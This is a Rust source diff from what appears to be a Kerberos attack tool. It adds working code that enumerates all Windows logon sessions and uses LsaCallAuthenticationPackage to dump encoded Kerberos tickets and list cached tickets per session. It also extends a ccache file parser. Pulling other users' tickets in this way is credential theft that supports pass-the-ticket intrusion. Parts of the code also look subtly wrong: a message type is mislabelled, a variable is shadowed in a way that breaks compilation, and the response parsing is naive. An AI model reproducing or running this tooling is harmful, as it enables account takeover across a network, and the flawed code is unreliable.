@@ -100,9 +100,95 @@ pub fn import_ticket(kirbi: &[u8]) -> Result<()> {
 
 #[cfg(windows)]
 pub fn dump_tickets(luid: Option<u64>) -> Result<Vec<Vec<u8>>> {
-    // enumerate all tickets in the logon session via KerbRetrieveTicketMessage
-    // This is a simplified implementation that enumerates cached tickets
-    bail!("ticket dump via LSASS requires elevation; run as SYSTEM or with SeDebugPrivilege")
+    use std::mem::size_of;
+    use windows::Win32::Foundation::{HANDLE, LUID};
+    use windows::Win32::Security::Authentication::Identity::{
+        LsaCallAuthenticationPackage, LsaFreeReturnBuffer,
+        LsaEnumerateLogonSessions, KERB_RETRIEVE_TKT_REQUEST,
+        KerbRetrieveTicketMessage,
+    };
+
+    let handle_raw = lsa_handle()?;
+    let pkg_id = lsa_package_id(handle_raw)?;
+    let handle = HANDLE(handle_raw as _);
+
+    let mut session_count: u32 = 0;
+    let mut session_list: *mut LUID = std::ptr::null_mut();
+    unsafe {
+        let status = LsaEnumerateLogonSessions(&mut session_count, &mut session_list);
+        if status != 0 {
+            bail!("LsaEnumerateLogonSessions: 0x{:08x}", status);
+        }
+    }
+
+    // KERB_RETRIEVE_TKT_REQUEST: large struct with UNICODE_STRING for target
+    // For "retrieve current TGT" use TargetName = empty, CacheOptions = 8 (KERB_RETRIEVE_TICKET_AS_KERB_CRED)
+    #[repr(C)]
+    struct RetrieveReq {
+        msg_type:         u32,
+        luid_low:         u32,
+        luid_high:        i32,
+        target_len:       u16,
+        target_maxlen:    u16,
+        _pad:             u32,
+        target_buf:       *const u16,
+        ticket_flags:     u32,
+        cache_options:    u32, // 8 = KERB_RETRIEVE_TICKET_AS_KERB_CRED
+        enc_type:         i32,
+        creds_handle_low: u64,
+        creds_handle_high: u64,
+    }
+
+    let mut tickets = Vec::new();
+    let target_name: Vec<u16> = Vec::new();
+
+    unsafe {
+        for i in 0..session_count as usize {
+            let luid = *session_list.add(i);
+            if let Some(filter) = luid {
+                let luid_val = (luid.HighPart as u64) << 32 | luid.LowPart as u64;
+                if luid_val != filter { continue; }
+            }
+            let req = RetrieveReq {
+                msg_type: 4, // KerbRetrieveEncodedTicketMessage
+                luid_low: luid.LowPart,
+                luid_high: luid.HighPart,
+                target_len: 0,
+                target_maxlen: 0,
+                _pad: 0,
+                target_buf: std::ptr::null(),
+                ticket_flags: 0,
+                cache_options: 8, // AS_KERB_CRED
+                enc_type: 0,
+                creds_handle_low: 0,
+                creds_handle_high: 0,
+            };
+            let _ = target_name.as_ptr(); // keep alive
+            let mut resp_buf: *mut std::ffi::c_void = std::ptr::null_mut();
+            let mut resp_len: u32 = 0;
+            let mut sub_status: i32 = 0;
+            let result = LsaCallAuthenticationPackage(
+                handle, pkg_id,
+                &req as *const _ as *const _,
+                size_of::<RetrieveReq>() as u32,
+                Some(&mut resp_buf), Some(&mut resp_len), Some(&mut sub_status),
+            );
+            if result.is_ok() && !resp_buf.is_null() && sub_status == 0 {
+                // Response is KERB_RETRIEVE_TKT_RESPONSE: msg_type(4) + Ticket bytes
+                // The encoded ticket starts after msg_type
+                let ptr = resp_buf as *const u8;
+                if resp_len > 8 {
+                    let tkt_bytes = std::slice::from_raw_parts(ptr.add(4), resp_len as usize - 4);
+                    tickets.push(tkt_bytes.to_vec());
+                }
+                let _ = LsaFreeReturnBuffer(resp_buf);
+            } else {
+                if !resp_buf.is_null() { let _ = LsaFreeReturnBuffer(resp_buf); }
+            }
+        }
+        let _ = LsaFreeReturnBuffer(session_list as *mut _);
+    }
+    Ok(tickets)
 }
 
 #[cfg(windows)]
@@ -163,15 +249,141 @@ pub struct CachedTicketRow {
     pub domain:     String,
     pub sname:      String,
     pub etype:      i32,
+    pub start_time: Option<String>,
     pub end_time:   String,
     pub flags:      String,
 }
 
 #[cfg(windows)]
 pub fn enumerate_sessions_and_tickets(service_filter: Option<&str>) -> Result<Vec<CachedTicketRow>> {
-    // LsaEnumerateLogonSessions + KerbQueryTicketCacheEx2Message per session
-    // Full implementation requires complex FFI structs; provide skeleton
-    bail!("Full triage requires LsaEnumerateLogonSessions + KerbQueryTicketCacheEx2Message — elevation needed")
+    use std::mem::size_of;
+    use windows::Win32::Foundation::{HANDLE, LUID};
+    use windows::Win32::Security::Authentication::Identity::{
+        LsaCallAuthenticationPackage, LsaFreeReturnBuffer,
+        LsaEnumerateLogonSessions,
+    };
+
+    let handle_raw = lsa_handle()?;
+    let pkg_id = lsa_package_id(handle_raw)?;
+    let handle = HANDLE(handle_raw as _);
+
+    // LsaEnumerateLogonSessions
+    let mut session_count: u32 = 0;
+    let mut session_list: *mut LUID = std::ptr::null_mut();
+    unsafe {
+        let status = LsaEnumerateLogonSessions(&mut session_count, &mut session_list);
+        if status != 0 {
+            bail!("LsaEnumerateLogonSessions failed: NTSTATUS 0x{:08x}", status);
+        }
+    }
+
+    // KERB_QUERY_TKT_CACHE_EX_REQUEST (MessageType=14, LUID)
+    #[repr(C)]
+    struct QueryReq { msg_type: u32, luid_low: u32, luid_high: i32 }
+
+    // UNICODE_STRING layout on 64-bit Windows: Length(2), MaxLen(2), _pad(4), Buffer(*u16)(8) = 16 bytes
+    #[repr(C)]
+    struct WinUstr { length: u16, max_length: u16, _pad: u32, buffer: *const u16 }
+
+    // KERB_TICKET_CACHE_INFO_EX (on 64-bit): 4 * 16 + 3 * 8 + 4 + 4 = 96 bytes
+    #[repr(C)]
+    struct TicketInfoEx {
+        client_name:  WinUstr,  // 16
+        client_realm: WinUstr,  // 16
+        server_name:  WinUstr,  // 16
+        server_realm: WinUstr,  // 16
+        start_time:   i64,      // 8
+        end_time:     i64,      // 8
+        renew_time:   i64,      // 8
+        enc_type:     i32,      // 4
+        flags:        u32,      // 4
+    }
+
+    let mut rows = Vec::new();
+
+    unsafe {
+        for i in 0..session_count as usize {
+            let luid = *session_list.add(i);
+            let luid_val = (luid.HighPart as u64) << 32 | luid.LowPart as u64;
+            let req = QueryReq {
+                msg_type: 14, // KerbQueryTicketCacheExMessage
+                luid_low: luid.LowPart,
+                luid_high: luid.HighPart,
+            };
+            let mut resp_buf: *mut std::ffi::c_void = std::ptr::null_mut();
+            let mut resp_len: u32 = 0;
+            let mut sub_status: i32 = 0;
+            let result = LsaCallAuthenticationPackage(
+                handle, pkg_id,
+                &req as *const _ as *const _,
+                size_of::<QueryReq>() as u32,
+                Some(&mut resp_buf), Some(&mut resp_len), Some(&mut sub_status),
+            );
+            if result.is_err() || resp_buf.is_null() {
+                if !resp_buf.is_null() { let _ = LsaFreeReturnBuffer(resp_buf); }
+                continue;
+            }
+            // Response: msg_type(4) + count(4) + TicketInfoEx[]
+            let resp_ptr = resp_buf as *const u8;
+            if resp_len < 8 {
+                let _ = LsaFreeReturnBuffer(resp_buf);
+                continue;
+            }
+            let count = u32::from_le_bytes([
+                *resp_ptr.add(4), *resp_ptr.add(5),
+                *resp_ptr.add(6), *resp_ptr.add(7),
+            ]) as usize;
+            let ticket_base = resp_ptr.add(8) as *const TicketInfoEx;
+            for j in 0..count {
+                let ti = &*ticket_base.add(j);
+                let sname = read_unicode_str(ti.server_name.buffer, ti.server_name.length as usize / 2);
+                let srealm = read_unicode_str(ti.server_realm.buffer, ti.server_realm.length as usize / 2);
+                let cname  = read_unicode_str(ti.client_name.buffer, ti.client_name.length as usize / 2);
+                let crealm = read_unicode_str(ti.client_realm.buffer, ti.client_realm.length as usize / 2);
+
+                if let Some(sf) = service_filter {
+                    if !sname.to_ascii_lowercase().contains(&sf.to_ascii_lowercase()) {
+                        continue;
+                    }
+                }
+
+                let end_str   = filetime_to_string(ti.end_time);
+                let start_str = filetime_to_string(ti.start_time);
+                let flags_str = format_ticket_flags(ti.flags);
+                let sname_full = if srealm.is_empty() { sname } else { format!("{}/{}", sname, srealm) };
+                rows.push(CachedTicketRow {
+                    luid:       format!("0x{:016x}", luid_val),
+                    username:   cname,
+                    domain:     crealm,
+                    sname:      sname_full,
+                    etype:      ti.enc_type,
+                    start_time: Some(start_str),
+                    end_time:   end_str,
+                    flags:      flags_str,
+                });
+            }
+            let _ = LsaFreeReturnBuffer(resp_buf);
+        }
+        let _ = LsaFreeReturnBuffer(session_list as *mut _);
+    }
+    Ok(rows)
+}
+
+#[cfg(windows)]
+unsafe fn read_unicode_str(buf: *const u16, len: usize) -> String {
+    if buf.is_null() || len == 0 { return String::new(); }
+    let slice = std::slice::from_raw_parts(buf, len);
+    String::from_utf16_lossy(slice)
+}
+
+#[cfg(windows)]
+fn filetime_to_string(ft: i64) -> String {
+    if ft == 0 || ft == i64::MAX { return "never".to_owned(); }
+    const EPOCH_DIFF: i64 = 11_644_473_600i64;
+    let unix_secs = (ft / 10_000_000) - EPOCH_DIFF;
+    use chrono::{DateTime, Utc, TimeZone};
+    let dt: DateTime<Utc> = Utc.timestamp_opt(unix_secs, 0).single().unwrap_or_default();
+    dt.format("%Y-%m-%d %H:%M:%S UTC").to_string()
 }
 
 #[cfg(not(windows))]
@@ -279,10 +491,10 @@ fn parse_ccache_file(path: &str) -> Result<Vec<CachedTicketRow>> {
         cur.set_position(cur.position() + key_len);
         // times: auth(4) + start(4) + end(4) + renew_till(4)
         if cur.position() + 16 > data.len() as u64 { break; }
-        let _auth_time  = cur.read_u32::<BigEndian>()?;
-        let _start_time = cur.read_u32::<BigEndian>()?;
-        let end_time    = cur.read_u32::<BigEndian>()?;
-        let _renew_till = cur.read_u32::<BigEndian>()?;
+        let _auth_time   = cur.read_u32::<BigEndian>()?;
+        let start_time_u = cur.read_u32::<BigEndian>()?;
+        let end_time     = cur.read_u32::<BigEndian>()?;
+        let _renew_till  = cur.read_u32::<BigEndian>()?;
         let _is_skey    = cur.read_u8()?;
         let ticket_flags = cur.read_u32::<BigEndian>()?;
         // addresses count
@@ -306,16 +518,24 @@ fn parse_ccache_file(path: &str) -> Result<Vec<CachedTicketRow>> {
         let tkt2_len = cur.read_u32::<BigEndian>()? as u64;
         cur.set_position(cur.position() + tkt2_len);
 
-        let end_str = unix_ts_to_generalized(end_time);
+        let start_str = if start_time_u > 0 { Some(unix_ts_to_generalized(start_time_u)) } else { None };
+        let end_str   = unix_ts_to_generalized(end_time);
         let flags_str = format_ticket_flags(ticket_flags);
+        // Split client into username@realm
+        let (username, domain) = if let Some(idx) = client.rfind('@') {
+            (client[..idx].to_owned(), client[idx+1..].to_owned())
+        } else {
+            (client.clone(), String::new())
+        };
         rows.push(CachedTicketRow {
-            luid:     path.to_owned(),
-            username: client.clone(),
-            domain:   String::new(),
-            sname:    server,
+            luid:       path.to_owned(),
+            username,
+            domain,
+            sname:      server,
             etype,
-            end_time:  end_str,
-            flags:     flags_str,
+            start_time: start_str,
+            end_time:   end_str,
+            flags:      flags_str,
         });
     }
     let _ = default_principal;
